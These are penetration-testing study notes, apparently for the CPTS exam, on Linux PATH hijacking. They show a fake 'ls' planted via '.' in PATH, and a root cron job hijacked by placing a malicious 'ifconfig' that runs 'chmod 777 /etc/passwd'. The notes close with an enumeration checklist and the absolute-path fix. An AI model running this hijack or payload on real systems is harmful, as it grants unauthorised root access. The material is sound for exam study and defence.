# Path Abuse (Linux) we have 2 ways

### WE have two method to do it : 

## 1.CPTS way: 
## 1. Overview

Concept: `PATH` is an environment variable that contains a list of directories where the system searches for executable commands.

- Allows users to execute commands without specifying the full binary path.
- Directories are searched in the order they appear in `PATH`.
- If a command exists in multiple directories, the first matching executable is executed.
- Improper PATH configuration can lead to privilege escalation.

### Check PATH Variable

```
echo $PATH
```

Or:

```
env | grep PATH
```

Example output:

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## 2. How PATH Works

If a script or executable is placed inside a directory listed in `PATH`, it can be executed from any working directory.

Example:

Create a script named `conncheck` inside `/usr/local/sbin`.

```
pwd
# /usr/local/sbin

conncheck
```

The command can also be executed from `/tmp`:

```
cd /tmp
conncheck
```

Important: The shell searches the directories in `PATH` to locate the executable.

## 3. PATH Manipulation

If we can modify a user's PATH variable, we may influence which executable gets executed.

### Step 1: Add Current Directory to PATH

```
PATH=.:$PATH
export PATH
```

Alternatively:

```
export PATH=.:$PATH
```

Verify:

```
echo $PATH
```

Example:

```
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

`.` represents the current working directory.

### Step 2: Create a Malicious Executable

Suppose the user executes `ls` without specifying its absolute path.

Create a fake `ls` script in the current directory:

```
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

### Step 3: Execute the Command

```
ls
```

Output:

```
PATH ABUSE!!
```

Why does this happen?

- Current directory (`.`) is first in PATH.
- Shell searches the current directory first.
- It finds our fake `ls` before `/bin/ls`.
- Our script executes instead of the original binary.

## 4. Privilege Escalation via PATH Abuse

Exam scenario:

If a privileged script or SUID program executes commands without absolute paths, and we can influence its PATH, we may be able to execute our own malicious binary with elevated privileges.

Example vulnerable code:

```
#!/bin/bash
ls
```

If this script runs with elevated privileges and uses an attacker-controlled PATH, command hijacking may be possible.

Important conditions:

1. A privileged script/program executes a command without an absolute path.
2. We can control or influence its PATH.
3. The privileged execution context preserves the manipulated PATH.
4. The command resolves to our malicious executable.

# 2nd way PATH Hijacking — (Cron job)

## 1. What is PATH Hijacking?

**PATH Hijacking** occurs when a privileged command or cron job executes a program **without specifying its absolute path**.

Linux searches the directories listed in `$PATH` from left to right. If an attacker can write to a directory that appears earlier in `$PATH`, they can place a malicious executable there and have it run instead of the legitimate binary.

### Example

The following cron job runs:

```cron
* * * * * root ifconfig > /tmp/ip.txt
```

Notice that it uses:

```bash
ifconfig
```

instead of:

```bash
/sbin/ifconfig
```

Linux therefore searches the configured `$PATH` to find `ifconfig`.

---

## 2. Vulnerable Crontab Configuration

Example `/etc/crontab`:

```cron
SHELL=/bin/sh

PATH=/home/armour/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12)
# |  |  |  |  .---- day of week (0 - 6)
# |  |  |  |  |
# *  *  *  *  * user-name command

* * * * * root ifconfig > /tmp/ip.txt
```

### Important

The first directory in `$PATH` is:

```text
/home/armour/bin
```

The cron job executes:

```bash
ifconfig
```

without an absolute path.

Therefore, Linux checks:

```text
/home/armour/bin/ifconfig
```

before checking the legitimate `ifconfig` binary in later PATH directories.

---

## 3. Exploitation

Create the directory:

```bash
mkdir -p /home/armour/bin
```

Create a malicious `ifconfig`:

```bash
echo 'chmod 777 /etc/passwd' > /home/armour/bin/ifconfig
```

Make it executable:

```bash
chmod +x /home/armour/bin/ifconfig
```

---

## 4. How the Attack Works

The cron job runs:

```bash
ifconfig > /tmp/ip.txt
```

Because `ifconfig` does not use an absolute path, Linux searches `$PATH`:

```text
/home/armour/bin
        ↓
/usr/local/sbin
        ↓
/usr/local/bin
        ↓
/usr/sbin
        ↓
...
```

The attacker-controlled file is found first:

```text
/home/armour/bin/ifconfig
```

Instead of the legitimate `ifconfig`, the malicious script is executed.

Because the cron job runs as:

```text
root
```

the malicious command executes with **root privileges**.

### Attack Flow

```text
Root Cron Job
      ↓
Runs `ifconfig`
      ↓
Linux searches `$PATH`
      ↓
Finds `/home/armour/bin/ifconfig`
      ↓
Attacker's malicious binary executes
      ↓
Executes with root privileges
```

---

## 5. Key Conditions

Look for all of the following:

```text
1. Privileged cron job
2. Command executed without an absolute path
3. Attacker can write to a PATH directory
4. Malicious executable is placed in that directory
```

### Vulnerable

```bash
ifconfig
```

### Safer

```bash
/sbin/ifconfig
```

Using the absolute path prevents PATH-based command substitution.

---

## 6. CPTS Exam Checklist

After getting a Linux shell:

```bash
cat /etc/crontab
```

Look for:

- Cron jobs running as `root`
- Commands without absolute paths
- The `$PATH` defined in `/etc/crontab`
- PATH directories writable by the current user

Check a PATH directory:

```bash
ls -ld /home/armour/bin
```

Check the current PATH:

```bash
echo $PATH
```
